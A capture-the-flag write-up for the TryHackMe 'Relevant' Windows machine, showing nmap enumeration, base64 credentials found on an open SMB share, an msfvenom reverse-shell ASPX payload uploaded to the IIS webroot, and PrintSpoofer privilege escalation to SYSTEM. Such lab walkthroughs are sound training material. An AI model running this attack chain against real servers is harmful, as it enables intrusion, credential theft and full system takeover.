Relavant (Tryhackme)

<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/10524728b2b462e8d164efe4e67ed087.jpeg" alt="Room Icon" width="150"/>

Penetration Testing Challenge

# Enumeration

## Nmap

```jsx
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server

135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn

445/tcp   open  microsoft-ds  syn-ack ttl 125 Windows Server 2016 Standard Evaluation 14393 microsoft-ds

3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-04T13:17:24
| Not valid after:  2025-12-04T13:17:24
| MD5:   9ddf:ed34:3c12:2d90:122e:611d:d885:719d
| SHA-1: 5577:0fbe:8a32:a7d3:3b5c:122e:ce23:b5bb:6961:b44d
|_ssl-date: 2025-06-05T13:23:37+00:00; -1s from scanner time.

49663/tcp open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0

49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC

```

## SMB (445)

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/Relevant]
└─$ smbclient -L \\\\10.10.102.138\\
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.102.138 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/Relevant]
└─$ smbclient \\\\10.10.102.138\\nt4wrksv
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

```

```jsx
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/Relevant]
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123 
```

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/Relevant]
└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```

![image](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/3f2c4eb2f420cf3dc3c24b324c83a916a4f5110d/Relevant(THM)/image%20(1).png?raw=true)




```jsx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f aspx -o rev.aspx

```

- `.aspx` is the file extension for **ASP.NET web pages**, used on **Windows servers running IIS**
- we will upload this from smb
- We got shell and get user.txt

## ROOT

- check whoami `/priv`

```jsx
SeImpersonatePrivilege enable
```

### PrintSpoofer

```jsx
┌──(kali㉿kali)-[/opt/tools/printspoofer]
└─$ smbclient \\\\10.10.102.138\\nt4wrksv
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer.exe
putting file PrintSpoofer.exe as \PrintSpoofer.exe (18.5 kb/s) (average 18.5 kb/s)
smb: \> 

```

```jsx
c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

06/05/2025  07:12 AM    <DIR>          .
06/05/2025  07:12 AM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
06/05/2025  07:12 AM            27,136 PrintSpoofer.exe
06/05/2025  06:52 AM             3,424 rev.aspx
               3 File(s)         30,658 bytes
               2 Dir(s)  21,045,948,416 bytes free

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
```

```jsx
C:\Windows\system32>whoami
whoami
nt authority\system

```
